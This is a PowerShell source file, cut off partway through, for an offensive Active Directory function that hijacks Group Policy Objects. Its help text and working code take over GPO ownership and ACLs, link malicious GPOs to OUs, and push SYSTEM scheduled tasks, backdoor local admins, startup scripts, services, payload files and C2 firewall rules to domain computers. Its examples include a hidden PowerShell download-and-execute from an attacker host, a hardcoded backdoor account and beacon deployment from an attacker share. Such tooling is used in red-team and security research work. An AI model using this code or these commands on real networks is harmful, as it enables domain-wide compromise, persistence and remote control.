function Set-DomainGPO {
<#
.SYNOPSIS
    Modifies Group Policy Object permissions, linkage, and settings in Active Directory.

.DESCRIPTION
    Set-DomainGPO is a flexible helper function for modifying GPO objects in AD.
    It supports various operations via parameter sets:

    - Owner modification (requires TakeOwnership permission on GPO)
    - ACL modification (requires WriteDacl permission on GPO)
    - Link GPO to OU/Domain/Site (requires WriteProperty on gPLink of target)
    - Unlink GPO from OU/Domain/Site (requires WriteProperty on gPLink of target)
    - Add Scheduled Task (requires write access to SYSVOL)
    - Add Local Group Member (requires write access to SYSVOL)
    - Add Startup/Logon Script (requires write access to SYSVOL)
    - Add Service (requires write access to SYSVOL)
    - Deploy File (requires write access to SYSVOL)
    - Add Firewall Rule (requires write access to SYSVOL)

    PERMISSION DEPENDENCIES:
    ========================
    GPO modifications require different permissions depending on the operation:

    1. SetOwner/GrantRights: Permissions are required on the GPO object itself
       - GPO AD path: CN={GUID},CN=Policies,CN=System,DC=domain,DC=com
       - Requires: TakeOwnership (for -Owner) or WriteDacl (for -GrantRights)

    2. LinkTo/UnlinkFrom: Permissions are required on the TARGET OU, NOT the GPO!
       - The gPLink attribute is stored on the OU/Domain/Site object
       - Requires: WriteProperty on gPLink attribute of the target OU
       - Note: You may have rights on the GPO but not on the target OU (or vice versa)

    3. SYSVOL Synchronization (automatic for SetOwner/GrantRights):
       - SYSVOL path: \\domain\SYSVOL\domain\Policies\{GUID}\
       - Requires: Write access to SYSVOL folder (usually SMB-based)
       - GPMC expects AD and SYSVOL ACLs to match; mismatched ACLs show "permissions inconsistent"
       - Auto-sync is enabled by default; use -NoSYSVOL to disable

    4. GPO Content Modifications (AddScheduledTask, AddLocalGroupMember, AddStartupScript):
       - These modify SYSVOL content directly
       - Require write access to SYSVOL folder
       - GPO version is automatically incremented (clients poll for version changes)
       - Machine-side changes increment User version by 0, Machine version by 1
       - Version format in AD: (UserVersion * 65536) + MachineVersion

    gPLink Format: [LDAP://cn={GUID},cn=policies,cn=system,DC=domain,DC=com;Options]
    Link Options: 0=Enabled, 1=Disabled, 2=Enforced, 3=Disabled+Enforced

.PARAMETER Identity
    DisplayName, DistinguishedName, or GUID of the GPO.

.PARAMETER Owner
    New owner for the GPO object (DOMAIN\user or DN format).
    Requires TakeOwnership permission on the GPO.

.PARAMETER GrantRights
    Rights to grant to a principal. Values: GenericAll, GenericWrite, WriteDacl, WriteOwner.
    Requires WriteDacl permission on the GPO.

.PARAMETER Principal
    Principal to grant rights to (used with -GrantRights).

.PARAMETER LinkTo
    DistinguishedName of target OU, Domain, or Site to link the GPO to.
    Requires WriteProperty on gPLink attribute of the target object.

.PARAMETER UnlinkFrom
    DistinguishedName of target OU, Domain, or Site to unlink the GPO from.
    Requires WriteProperty on gPLink attribute of the target object.

.PARAMETER LinkEnabled
    When used with -LinkTo, creates an enabled link (default).
    When used with -UnlinkFrom, this parameter is ignored.

.PARAMETER LinkEnforced
    When used with -LinkTo, creates an enforced link.
    Enforced links cannot be blocked by lower-level Block Inheritance settings.

.PARAMETER SyncSYSVOL
    Standalone parameter to synchronize AD permissions to SYSVOL folder.
    Use this to fix existing GPOs with mismatched permissions.
    For SetOwner/GrantRights, SYSVOL sync happens automatically (use -NoSYSVOL to disable).

.PARAMETER NoSYSVOL
    Disables automatic SYSVOL synchronization for SetOwner and GrantRights operations.
    Use this when you only want to modify AD permissions without touching SYSVOL.
    Has no effect on LinkTo/UnlinkFrom operations (they don't touch SYSVOL).

.PARAMETER AddScheduledTask
    Creates an Immediate Scheduled Task in the GPO that runs immediately when GPO is applied.
    The task runs once with SYSTEM privileges (default) or as a specific user.
    Requires write access to SYSVOL.

.PARAMETER TaskName
    Name for the scheduled task (used with -AddScheduledTask).

.PARAMETER TaskCommand
    Command to execute (e.g., "cmd.exe", "powershell.exe").

.PARAMETER TaskArguments
    Arguments for the command (e.g., "/c whoami > C:\pwned.txt").

.PARAMETER TaskRunAs
    Principal for task execution: SYSTEM (default), Users, or Interactive.

.PARAMETER TaskAuthor
    Author name for the scheduled task registration info. If not specified,
    auto-detects from the current session user (DOMAIN\username). Falls back
    to DOMAIN\Administrator if session user is not available.

.PARAMETER AddLocalGroupMember
    Adds a user/group to a local group on target computers via GPO.
    Commonly used to add backdoor user to local Administrators.
    Requires write access to SYSVOL.

.PARAMETER LocalGroup
    Name of the local group to modify (e.g., "Administrators", "Remote Desktop Users").
    Can also use SID format (S-1-5-32-544 for Administrators).

.PARAMETER MemberToAdd
    User or group to add to the local group (DOMAIN\user format or SID).

.PARAMETER AddStartupScript
    Adds a computer startup script that runs with SYSTEM privileges.
    Script runs at every computer startup before user logon.
    Requires write access to SYSVOL.

.PARAMETER AddLogonScript
    Adds a user logon script that runs when users log on.
    Script runs in user context after logon.
    Requires write access to SYSVOL.

.PARAMETER ScriptPath
    Path to the script file to add. Will be copied to SYSVOL.

.PARAMETER ScriptContent
    Inline script content (alternative to -ScriptPath). Creates script in SYSVOL.

.PARAMETER ScriptName
    Name for the script file in SYSVOL (used with -ScriptContent).

.PARAMETER ScriptParameters
    Parameters to pass to the script.

.PARAMETER AddService
    Installs a Windows service on target computers via GPO.
    The service is installed using Group Policy Preferences (GPP).
    Requires write access to SYSVOL.

.PARAMETER ServiceName
    Name of the service to create (used with -AddService).

.PARAMETER ServiceDisplayName
    Display name for the service (optional, defaults to ServiceName).

.PARAMETER BinaryPath
    Path to the service executable (e.g., "C:\Windows\Temp\beacon.exe").

.PARAMETER StartType
    Service start type: Automatic, Manual, Disabled, or AutomaticDelayedStart.

.PARAMETER ServiceAccount
    Account to run the service as: LocalSystem (default), LocalService, NetworkService, or DOMAIN\user.

.PARAMETER DeployFile
    Deploys a file to target computers via GPO Files preference.
    Useful for staging payloads or configuration files.
    Requires write access to SYSVOL.

.PARAMETER SourceFile
    Path to the source file (local or UNC path). Will be embedded in GPO or referenced.

.PARAMETER DestinationPath
    Destination path on target computers (e.g., "C:\Windows\Temp\payload.exe").

.PARAMETER FileAction
    Action to perform: Create (default), Replace, Update, or Delete.

.PARAMETER AddFirewallRule
    Creates a Windows Firewall rule on target computers via GPO.
    Useful for allowing C2 traffic or disabling security.
    Requires write access to SYSVOL.

.PARAMETER RuleName
    Name of the firewall rule (used with -AddFirewallRule).

.PARAMETER RuleDirection
    Direction: Inbound or Outbound.

.PARAMETER RuleAction
    Action: Allow or Block.

.PARAMETER RuleProtocol
    Protocol: TCP, UDP, or Any.

.PARAMETER RuleLocalPort
    Local port(s) for the rule (e.g., "445", "80,443", "1024-65535").

.PARAMETER RuleRemotePort
    Remote port(s) for the rule.

.PARAMETER RuleRemoteAddress
    Remote addresses for the rule (e.g., "10.0.0.0/8", "any", or specific IP).

.PARAMETER RuleProgram
    Program path for application-based rules.

.PARAMETER PassThru
    Returns a result object instead of only console output.
    Useful for scripting and automation.

.PARAMETER Domain
    Target domain.

.PARAMETER Server
    Specific Domain Controller.

.PARAMETER Credential
    PSCredential object for authentication.

.EXAMPLE
    Set-DomainGPO -Identity "Default Domain Policy" -Owner "DOMAIN\attacker"
    Takes ownership of Default Domain Policy GPO.

.EXAMPLE
    Set-DomainGPO -Identity "{31B2F340-016D-11D2-945F-00C04FB984F9}" -GrantRights GenericAll -Principal "DOMAIN\attacker"
    Grants GenericAll rights to attacker on GPO (identified by GUID).

.EXAMPLE
    Set-DomainGPO -Identity "Vulnerable GPO" -GrantRights GenericWrite -Principal "lowpriv"
    Grants GenericWrite to low-privilege user for privilege escalation.

.EXAMPLE
    Set-DomainGPO -Identity "Malicious GPO" -LinkTo "OU=Domain Controllers,DC=contoso,DC=com"
    Links GPO to Domain Controllers OU (enabled by default).

.EXAMPLE
    Set-DomainGPO -Identity "Malicious GPO" -LinkTo "OU=Workstations,DC=contoso,DC=com" -LinkEnforced
    Links GPO to Workstations OU with enforcement (cannot be blocked).

.EXAMPLE
    Set-DomainGPO -Identity "Test GPO" -UnlinkFrom "OU=Test,DC=contoso,DC=com"
    Removes GPO link from Test OU.

.EXAMPLE
    Set-DomainGPO -Identity "Modified GPO" -SyncSYSVOL
    Synchronizes AD permissions to SYSVOL folder (fixes "permissions inconsistent" warning).

.EXAMPLE
    Set-DomainGPO -Identity "GPO" -GrantRights GenericAll -Principal "attacker"
    Grants GenericAll and automatically mirrors the change to SYSVOL (default behavior).

.EXAMPLE
    Set-DomainGPO -Identity "GPO" -GrantRights GenericAll -Principal "attacker" -NoSYSVOL
    Grants GenericAll on AD object only, without touching SYSVOL permissions.

.EXAMPLE
    Set-DomainGPO -Identity "Malicious GPO" -AddScheduledTask -TaskName "Update" -TaskCommand "cmd.exe" -TaskArguments "/c whoami > C:\pwned.txt"
    Creates an Immediate Scheduled Task that runs cmd.exe as SYSTEM.

.EXAMPLE
    Set-DomainGPO -Identity "Backdoor GPO" -AddScheduledTask -TaskName "Beacon" -TaskCommand "powershell.exe" -TaskArguments "-nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://attacker/shell.ps1')"
    Creates a scheduled task that downloads and executes a PowerShell payload.

.EXAMPLE
    Set-DomainGPO -Identity "Persistence GPO" -AddLocalGroupMember -LocalGroup "Administrators" -MemberToAdd "CONTOSO\backdoor"
    Adds backdoor user to local Administrators on all computers where GPO applies.

.EXAMPLE
    Set-DomainGPO -Identity "Persistence GPO" -AddLocalGroupMember -LocalGroup "Remote Desktop Users" -MemberToAdd "CONTOSO\attacker"
    Adds attacker to Remote Desktop Users for RDP access.

.EXAMPLE
    Set-DomainGPO -Identity "Startup GPO" -AddStartupScript -ScriptContent "net user backdoor P@ssw0rd123 /add && net localgroup administrators backdoor /add" -ScriptName "update.bat"
    Creates a startup script that creates a local admin backdoor user.

.EXAMPLE
    Set-DomainGPO -Identity "Logon GPO" -AddLogonScript -ScriptPath "C:\tools\beacon.ps1" -ScriptName "updates.ps1"
    Copies a local script to SYSVOL and configures it as a logon script.

.EXAMPLE
    Set-DomainGPO -Identity "Service GPO" -AddService -ServiceName "UpdateSvc" -BinaryPath "C:\Windows\Temp\beacon.exe" -StartType Automatic
    Creates a persistent service that starts automatically on boot.

.EXAMPLE
    Set-DomainGPO -Identity "Service GPO" -AddService -ServiceName "HelperSvc" -BinaryPath "C:\Temp\helper.exe" -ServiceAccount "CONTOSO\svc_admin"
    Creates a service running under a domain account.

.EXAMPLE
    Set-DomainGPO -Identity "Deploy GPO" -DeployFile -SourceFile "C:\tools\payload.exe" -DestinationPath "C:\Windows\Temp\legit.exe"
    Deploys a file to all target computers (creates file from embedded content).

.EXAMPLE
    Set-DomainGPO -Identity "Deploy GPO" -DeployFile -SourceFile "\\attacker\share\beacon.exe" -DestinationPath "C:\ProgramData\update.exe" -FileAction Replace
    Deploys a file from a network share, replacing if it exists.

.EXAMPLE
    Set-DomainGPO -Identity "FW GPO" -AddFirewallRule -RuleName "Allow Updates" -RuleDirection Outbound -RuleAction Allow -RuleProtocol TCP -RuleRemotePort 443
    Creates an outbound firewall rule allowing HTTPS traffic.

.EXAMPLE
    Set-DomainGPO -Identity "FW GPO" -AddFirewallRule -RuleName "C2 Channel" -RuleDirection Outbound -RuleAction Allow -RuleProtocol TCP -RuleRemoteAddress "10.10.10.10" -RuleRemotePort "8080,8443"
    Creates an outbound rule for C2 communication to specific IP and ports.

.EXAMPLE
    Set-DomainGPO -Identity "FW GPO" -AddFirewallRule -RuleName "Beacon" -RuleDirection Inbound -RuleAction Allow -RuleProgram "C:\Windows\Temp\beacon.exe"
    Creates an inbound rule allowing traffic to a specific program.

.OUTPUTS
    PSCustomObject with operation result

.NOTES
    Author: Alexander Sturz (@_61106960_)
#>
    [CmdletBinding()]
    param(
        [Parameter(Position=0, Mandatory=$true, ValueFromPipeline=$true)]
        [Alias('DisplayName', 'Name', 'GPO', 'GUID')]
        [string]$Identity,

        # Owner modification
        [Parameter(ParameterSetName='SetOwner', Mandatory=$true)]
        [string]$Owner,

        # ACL modification
        [Parameter(ParameterSetName='GrantRights', Mandatory=$true)]
        [ValidateSet('GenericAll','GenericWrite','WriteDacl','WriteOwner')]
        [string]$GrantRights,

        [Parameter(ParameterSetName='GrantRights', Mandatory=$true)]
        [string]$Principal,

        # GPO Linking
        [Parameter(ParameterSetName='LinkGPO', Mandatory=$true)]
        [Alias('LinkToOU')]
        [string]$LinkTo,

        [Parameter(ParameterSetName='UnlinkGPO', Mandatory=$true)]
        [Alias('UnlinkFromOU')]
        [string]$UnlinkFrom,

        [Parameter(ParameterSetName='LinkGPO', Mandatory=$false)]
        [switch]$LinkEnabled,

        [Parameter(ParameterSetName='LinkGPO', Mandatory=$false)]
        [switch]$LinkEnforced,

        # SYSVOL Synchronization
        [Parameter(ParameterSetName='SyncSYSVOL', Mandatory=$true)]
        [switch]$SyncSYSVOL,

        # Disable automatic SYSVOL sync for SetOwner/GrantRights
        [Parameter(ParameterSetName='SetOwner', Mandatory=$false)]
        [Parameter(ParameterSetName='GrantRights', Mandatory=$false)]
        [switch]$NoSYSVOL,

        # Scheduled Task parameters
        [Parameter(ParameterSetName='AddScheduledTask', Mandatory=$true)]
        [switch]$AddScheduledTask,

        [Parameter(ParameterSetName='AddScheduledTask', Mandatory=$true)]
        [string]$TaskName,

        [Parameter(ParameterSetName='AddScheduledTask', Mandatory=$true)]
        [string]$TaskCommand,

        [Parameter(ParameterSetName='AddScheduledTask', Mandatory=$false)]
        [string]$TaskArguments = "",

        [Parameter(ParameterSetName='AddScheduledTask', Mandatory=$false)]
        [ValidateSet('SYSTEM', 'Users', 'Interactive')]
        [string]$TaskRunAs = "SYSTEM",

        [Parameter(ParameterSetName='AddScheduledTask', Mandatory=$false)]
        [string]$TaskAuthor,

        # Local Group Member parameters
        [Parameter(ParameterSetName='AddLocalGroupMember', Mandatory=$true)]
        [switch]$AddLocalGroupMember,

        [Parameter(ParameterSetName='AddLocalGroupMember', Mandatory=$true)]
        [string]$LocalGroup,

        [Parameter(ParameterSetName='AddLocalGroupMember', Mandatory=$true)]
        [string]$MemberToAdd,

        # Startup Script parameters
        [Parameter(ParameterSetName='AddStartupScript', Mandatory=$true)]
        [switch]$AddStartupScript,

        # Logon Script parameters
        [Parameter(ParameterSetName='AddLogonScript', Mandatory=$true)]
        [switch]$AddLogonScript,

        # Shared script parameters
        [Parameter(ParameterSetName='AddStartupScript', Mandatory=$false)]
        [Parameter(ParameterSetName='AddLogonScript', Mandatory=$false)]
        [string]$ScriptPath,

        [Parameter(ParameterSetName='AddStartupScript', Mandatory=$false)]
        [Parameter(ParameterSetName='AddLogonScript', Mandatory=$false)]
        [string]$ScriptContent,

        [Parameter(ParameterSetName='AddStartupScript', Mandatory=$false)]
        [Parameter(ParameterSetName='AddLogonScript', Mandatory=$false)]
        [string]$ScriptName,

        [Parameter(ParameterSetName='AddStartupScript', Mandatory=$false)]
        [Parameter(ParameterSetName='AddLogonScript', Mandatory=$false)]
        [string]$ScriptParameters = "",

        # Service Installation parameters
        [Parameter(ParameterSetName='AddService', Mandatory=$true)]
        [switch]$AddService,

        [Parameter(ParameterSetName='AddService', Mandatory=$true)]
        [string]$ServiceName,

        [Parameter(ParameterSetName='AddService', Mandatory=$false)]
        [string]$ServiceDisplayName,

        [Parameter(ParameterSetName='AddService', Mandatory=$true)]
        [string]$BinaryPath,

        [Parameter(ParameterSetName='AddService', Mandatory=$false)]
        [ValidateSet('Automatic', 'Manual', 'Disabled', 'AutomaticDelayedStart')]
        [string]$StartType = "Automatic",

        [Parameter(ParameterSetName='AddService', Mandatory=$false)]
        [string]$ServiceAccount = "LocalSystem",

        # File Deployment parameters
        [Parameter(ParameterSetName='DeployFile', Mandatory=$true)]
        [switch]$DeployFile,

        [Parameter(ParameterSetName='DeployFile', Mandatory=$true)]
        [string]$SourceFile,

        [Parameter(ParameterSetName='DeployFile', Mandatory=$true)]
        [string]$DestinationPath,

        [Parameter(ParameterSetName='DeployFile', Mandatory=$false)]
        [ValidateSet('Create', 'Replace', 'Update', 'Delete')]
        [string]$FileAction = "Create",

        # Firewall Rule parameters
        [Parameter(ParameterSetName='AddFirewallRule', Mandatory=$true)]
        [switch]$AddFirewallRule,

        [Parameter(ParameterSetName='AddFirewallRule', Mandatory=$true)]
        [string]$RuleName,

        [Parameter(ParameterSetName='AddFirewallRule', Mandatory=$true)]
        [ValidateSet('Inbound', 'Outbound')]
        [string]$RuleDirection,

        [Parameter(ParameterSetName='AddFirewallRule', Mandatory=$false)]
        [ValidateSet('Allow', 'Block')]
        [string]$RuleAction = "Allow",

        [Parameter(ParameterSetName='AddFirewallRule', Mandatory=$false)]
        [ValidateSet('TCP', 'UDP', 'Any')]
        [string]$RuleProtocol = "TCP",

        [Parameter(ParameterSetName='AddFirewallRule', Mandatory=$false)]
        [string]$RuleLocalPort,

        [Parameter(ParameterSetName='AddFirewallRule', Mandatory=$false)]
        [string]$RuleRemotePort,

        [Parameter(ParameterSetName='AddFirewallRule', Mandatory=$false)]
        [string]$RuleRemoteAddress = "Any",

        [Parameter(ParameterSetName='AddFirewallRule', Mandatory=$false)]
        [string]$RuleProgram,

        # Authentication parameters
        [Parameter(Mandatory=$false)]
        [string]$Domain,

        [Parameter(Mandatory=$false)]
        [switch]$PassThru,

        [Parameter(Mandatory=$false)]
        [string]$Server,

        [Parameter(Mandatory=$false)]
        [System.Management.Automation.PSCredential]$Credential
    )

    begin {
        Write-Log "[Set-DomainGPO] Starting GPO modification: $Identity (wrapper for Set-DomainObject)"
    }

    process {
        # Ensure LDAP connection at start of process block
        $ConnectionParams = @{}
        if ($Domain) { $ConnectionParams['Domain'] = $Domain }
        if ($Server) { $ConnectionParams['Server'] = $Server }
        if ($Credential) { $ConnectionParams['Credential'] = $Credential }

        if (-not (Ensure-LDAPConnection @ConnectionParams)) {
            if ($PassThru) {
                return [PSCustomObject]@{
                    Operation = "Set-DomainGPO"
                    GPO = $Identity
                    Success = $false
                    Message = "No LDAP connection available"
                }
            }
            return
        }

        try {
            # Reset Script-scope result variables at start of each pipeline iteration
            # Prevents state leakage between pipeline items (e.g., "GPO1","GPO2" | Set-DomainGPO -Owner ...)
            $Script:_SetOwnerResult = $null
            $Script:_GrantRightsResult = $null

            # Step 1: Find the target GPO using Get-DomainGPO
            Write-Log "[Set-DomainGPO] Searching for GPO: $Identity"

            $TargetGPO = @(Get-DomainGPO -Identity $Identity @ConnectionParams)[0]

            if (-not $TargetGPO) {
                throw "GPO '$Identity' not Found"
            }

            $GPODN = $TargetGPO.distinguishedName
            $GPOName = $TargetGPO.displayName
            Write-Log "[Set-DomainGPO] Found GPO: $GPODN"

            switch ($PSCmdlet.ParameterSetName) {
                'SetOwner' {
                    Write-Log "[Set-DomainGPO] Setting owner for: $GPOName"

                    try {
                        $Result = Set-DomainObject -Identity $GPODN -SetOwner -Principal $Owner @ConnectionParams

                        # Check for explicit failure or null result
                        if ($null -eq $Result) {
                            throw "Set-DomainObject returned no result - operation may have failed silently"
                        }
                        if ($Result -is [PSCustomObject] -and $Result.PSObject.Properties['Success'] -and -not $Result.Success) {
                            throw "Set-DomainObject failed: $($Result.Message)"
                        }
                        if ($Result -eq $false) {
                            throw "Set-DomainObject returned false"
                        }

                        # Store result for later (after SYSVOL sync)
                        $Script:_SetOwnerResult = [PSCustomObject]@{
                            Operation = "SetOwner"
                            GPO = $GPOName
                            DistinguishedName = $GPODN
                            NewOwner = $Owner
                            Success = $true
                            Message = "Owner successfully changed"
                            SYSVOLSynced = $null  # Will be updated after SYSVOL sync
                        }

                        if (-not $PassThru) {
                            Show-Line "Successfully changed owner of GPO '$GPOName' to: $Owner" -Class Hint
                        }
                    } catch {
                        throw "Failed to set owner: $_"
                    }
                }

                'GrantRights' {
                    Write-Log "[Set-DomainGPO] Granting $GrantRights rights to $Principal on: $GPOName"

                    try {
                        $Result = Set-DomainObject -Identity $GPODN -GrantACE -Principal $Principal -Rights $GrantRights @ConnectionParams

                        # Check for explicit failure or null result
                        if ($null -eq $Result) {
                            throw "Set-DomainObject returned no result - operation may have failed silently"
                        }
                        if ($Result -is [PSCustomObject] -and $Result.PSObject.Properties['Success'] -and -not $Result.Success) {
                            throw "Set-DomainObject failed: $($Result.Message)"
                        }
                        if ($Result -eq $false) {
                            throw "Set-DomainObject returned false"
                        }

                        # Store result for later (after SYSVOL sync)
                        $Script:_GrantRightsResult = [PSCustomObject]@{
                            Operation = "GrantRights"
                            GPO = $GPOName
                            DistinguishedName = $GPODN
                            Principal = $Principal
                            Rights = $GrantRights
                            Success = $true
                            Message = "Rights successfully granted"
                            SYSVOLSynced = $null  # Will be updated after SYSVOL sync
                        }

                        if (-not $PassThru) {
                            Show-Line "Successfully granted $GrantRights to $Principal on GPO: $GPOName" -Class Hint
                        }
                    } catch {
                        throw "Failed to grant rights: $_"
                    }
                }

                'LinkGPO' {
                    Write-Log "[Set-DomainGPO] Linking GPO '$GPOName' to: $LinkTo"

                    try {
                        # Verify target OU/Domain/Site exists
                        $TargetObject = @(Get-DomainObject -Identity $LinkTo @ConnectionParams)[0]
                        if (-not $TargetObject) {
                            throw "Target object '$LinkTo' not found"
                        }

                        $TargetDN = $TargetObject.distinguishedName
                        Write-Log "[Set-DomainGPO] Found target: $TargetDN"

                        # Read current gPLink from target OU via Invoke-LDAPSearch
                        $TargetLDAPResult = @(Invoke-LDAPSearch -Filter "(distinguishedName=$TargetDN)" -Properties @('gPLink') -SizeLimit 1)[0]
                        $currentGPLink = if ($TargetLDAPResult -and $TargetLDAPResult.gPLink) { $TargetLDAPResult.gPLink } else { $null }
                        Write-Log "[Set-DomainGPO] Current gPLink: $currentGPLink"

                        # Build GPO LDAP path for gPLink
                        # Extract GUID from GPO DN: CN={GUID},CN=Policies,CN=System,DC=...
                        $GPOGUID = if ($GPODN -match 'CN=(\{[0-9A-Fa-f\-]{36}\})') { $Matches[1] } else { $null }
                        if (-not $GPOGUID) {
                            throw "Could not extract GUID from GPO DN: $GPODN"
                        }

                        # Build the gPLink entry: [LDAP://CN={GUID},CN=Policies,CN=System,DC=domain,DC=com;Options]
                        $GPOLDAPPath = "LDAP://$GPODN"

                        # Calculate link options: 0=Enabled, 1=Disabled, 2=Enforced, 3=Disabled+Enforced
                        $linkOptions = 0
                        if (-not $LinkEnabled -and -not $LinkEnforced) {
                            # Default: Enabled
                            $linkOptions = 0
                        }
                        if ($LinkEnforced) {
                            $linkOptions = $linkOptions -bor 2
                        }
                        # Note: -LinkEnabled is default behavior, so we only set bit 0 (Disabled) if explicitly needed
                        # Currently we don't have a -LinkDisabled parameter, so links are always enabled

                        $newGPLinkEntry = "[$GPOLDAPPath;$linkOptions]"

                        # Check if GPO is already linked
                        if ($currentGPLink -and $currentGPLink -match [regex]::Escape($GPOGUID)) {
                            throw "GPO '$GPOName' is already linked to '$TargetDN'. Use -UnlinkFrom first to remove existing link."
                        }

                        # Append to existing gPLink (prepend for higher precedence - first GPO wins)
                        $newGPLink = if ($currentGPLink) {
                            "$newGPLinkEntry$currentGPLink"
                        } else {
                            $newGPLinkEntry
                        }

                        Write-Log "[Set-DomainGPO] New gPLink: $newGPLink"

                        # Set the new gPLink value via ModifyRequest
                        $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest
                        $ModifyRequest.DistinguishedName = $TargetDN
                        $Modification = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
                        $Modification.Name = "gPLink"
                        $Modification.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace
                        $Modification.Add($newGPLink) | Out-Null
                        $ModifyRequest.Modifications.Add($Modification) | Out-Null
                        $Response = $Script:LdapConnection.SendRequest($ModifyRequest)
                        if ($Response.ResultCode -ne [System.DirectoryServices.Protocols.ResultCode]::Success) {
                            throw "LDAP ModifyRequest failed: $($Response.ResultCode) - $($Response.ErrorMessage)"
                        }

                        $linkStatusText = if ($LinkEnforced) { "Enforced" } else { "Enabled" }

                        if ($PassThru) {
                            return [PSCustomObject]@{
                                Operation = "LinkGPO"
                                GPO = $GPOName
                                GPOGUID = $GPOGUID
                                TargetDN = $TargetDN
                                LinkStatus = $linkStatusText
                                LinkOptions = $linkOptions
                                Success = $true
                                Message = "GPO successfully linked"
                            }
                        } else {
                            Show-Line "Successfully linked GPO '$GPOName' to '$TargetDN' (Status: $linkStatusText)" -Class Hint
                        }

                    } catch {
                        throw "Failed to link GPO: $_"
                    }
                }

                'UnlinkGPO' {
                    Write-Log "[Set-DomainGPO] Unlinking GPO '$GPOName' from: $UnlinkFrom"

                    try {
                        # Verify target OU/Domain/Site exists
                        $TargetObject = @(Get-DomainObject -Identity $UnlinkFrom @ConnectionParams)[0]
                        if (-not $TargetObject) {
                            throw "Target object '$UnlinkFrom' not found"
                        }

                        $TargetDN = $TargetObject.distinguishedName
                        Write-Log "[Set-DomainGPO] Found target: $TargetDN"

                        # Read current gPLink from target OU via Invoke-LDAPSearch
                        $TargetLDAPResult = @(Invoke-LDAPSearch -Filter "(distinguishedName=$TargetDN)" -Properties @('gPLink') -SizeLimit 1)[0]
                        $currentGPLink = if ($TargetLDAPResult -and $TargetLDAPResult.gPLink) { $TargetLDAPResult.gPLink } else { $null }
                        Write-Log "[Set-DomainGPO] Current gPLink: $currentGPLink"

                        if (-not $currentGPLink) {
                            throw "No GPO links found on '$TargetDN'"
                        }

                        # Extract GUID from GPO DN
                        $GPOGUID = if ($GPODN -match 'CN=(\{[0-9A-Fa-f\-]{36}\})') { $Matches[1] } else { $null }
                        if (-not $GPOGUID) {
                            throw "Could not extract GUID from GPO DN: $GPODN"
                        }

                        # Check if GPO is actually linked
                        if ($currentGPLink -notmatch [regex]::Escape($GPOGUID)) {
                            throw "GPO '$GPOName' is not linked to '$TargetDN'"
                        }

                        # Remove the GPO link entry from gPLink
                        # gPLink format: [LDAP://CN={GUID},...;Options][LDAP://CN={GUID2},...;Options]
                        # Pattern to match: [LDAP://...{GUID}...;digit]
                        $removePattern = '\[LDAP://[^]]*' + [regex]::Escape($GPOGUID) + '[^]]*;\d+\]'
                        $newGPLink = [regex]::Replace($currentGPLink, $removePattern, '', [System.Text.RegularExpressions.RegexOptions]::IgnoreCase)

                        Write-Log "[Set-DomainGPO] New gPLink after removal: $newGPLink"

                        # Set the new gPLink value (or clear if empty) via ModifyRequest
                        $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest
                        $ModifyRequest.DistinguishedName = $TargetDN
                        $Modification = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
                        $Modification.Name = "gPLink"
                        if ([string]::IsNullOrWhiteSpace($newGPLink)) {
                            $Modification.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Delete
                        } else {
                            $Modification.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace
                            $Modification.Add($newGPLink) | Out-Null
                        }
                        $ModifyRequest.Modifications.Add($Modification) | Out-Null
                        $Response = $Script:LdapConnection.SendRequest($ModifyRequest)
                        if ($Response.ResultCode -ne [System.DirectoryServices.Protocols.ResultCode]::Success) {
                            throw "LDAP ModifyRequest failed: $($Response.ResultCode) - $($Response.ErrorMessage)"
                        }

                        if ($PassThru) {
                            return [PSCustomObject]@{
                                Operation = "UnlinkGPO"
                                GPO = $GPOName
                                GPOGUID = $GPOGUID
                                TargetDN = $TargetDN
                                Success = $true
                                Message = "GPO successfully unlinked"
                            }
                        } else {
                            Show-Line "Successfully unlinked GPO '$GPOName' from '$TargetDN'" -Class Hint
                        }

                    } catch {
                        throw "Failed to unlink GPO: $_"
                    }
                }

                'SyncSYSVOL' {
                    # Standalone SYSVOL sync - just sync without other modifications
                    Write-Log "[Set-DomainGPO] Standalone SYSVOL synchronization for: $GPOName"

                    $syncResult = Sync-GPOSYSVOLPermissions -GPODN $GPODN -GPOName $GPOName -Credential $Credential

                    if ($PassThru) {
                        return $syncResult
                    } elseif ($syncResult.Success) {
                        Show-Line "Successfully synchronized SYSVOL permissions for GPO '$GPOName'" -Class Hint
                    } else {
                        throw $syncResult.Message
                    }
                }

                'AddScheduledTask' {
                    Write-Log "[Set-DomainGPO] Adding Immediate Scheduled Task to GPO: $GPOName"

                    try {
                        # Extract GPO GUID
                        $GPOGUID = if ($GPODN -match 'CN=(\{[0-9A-Fa-f\-]{36}\})') { $Matches[1] } else { $null }
                        if (-not $GPOGUID) {
                            throw "Could not extract GUID from GPO DN: $GPODN"
                        }

                        # Prepare variables for closure
                        $domainName = $Script:LDAPContext.Domain
                        $gpoGuid = $GPOGUID
                        $taskNameVal = $TaskName
                        $taskCommandVal = $TaskCommand
                        $taskArgumentsVal = $TaskArguments
                        $taskRunAsVal = $TaskRunAs
                        $taskAuthorOverride = $TaskAuthor  # Optional: if empty, auto-detect from session

                        # Use Invoke-SMBAccess to create ScheduledTasks.xml
                        $smbResult = Invoke-SMBAccess -Description "Create GPO Scheduled Task" -ErrorHandling Stop -ScriptBlock {
                            param($basePath)

                            $gpoBasePath = Join-Path $basePath "$domainName\Policies\$gpoGuid"
                            $machinePrefsPath = Join-Path $gpoBasePath "Machine\Preferences\ScheduledTasks"

                            if (-not (Test-Path $gpoBasePath)) {
                                throw "SYSVOL folder not found: $gpoBasePath"
                            }

                            # Create folder structure
                            if (-not (Test-Path $machinePrefsPath)) {
                                $null = New-Item -Path $machinePrefsPath -ItemType Directory -Force -ErrorAction Stop
                            }

                            $scheduledTasksXmlPath = Join-Path $machinePrefsPath "ScheduledTasks.xml"

                            # Generate unique task UID
                            $taskUID = "{$([System.Guid]::NewGuid().ToString().ToUpper())}"

                            # Determine principal, runAs, and logonType based on TaskRunAs
                            $propertiesRunAs = ""
                            $propertiesLogonType = ""
                            $principalXml = ""

                            switch ($taskRunAsVal) {
                                'SYSTEM' {
                                    $propertiesRunAs = "NT AUTHORITY\SYSTEM"
                                    $propertiesLogonType = "S4U"
                                    $principalXml = @"
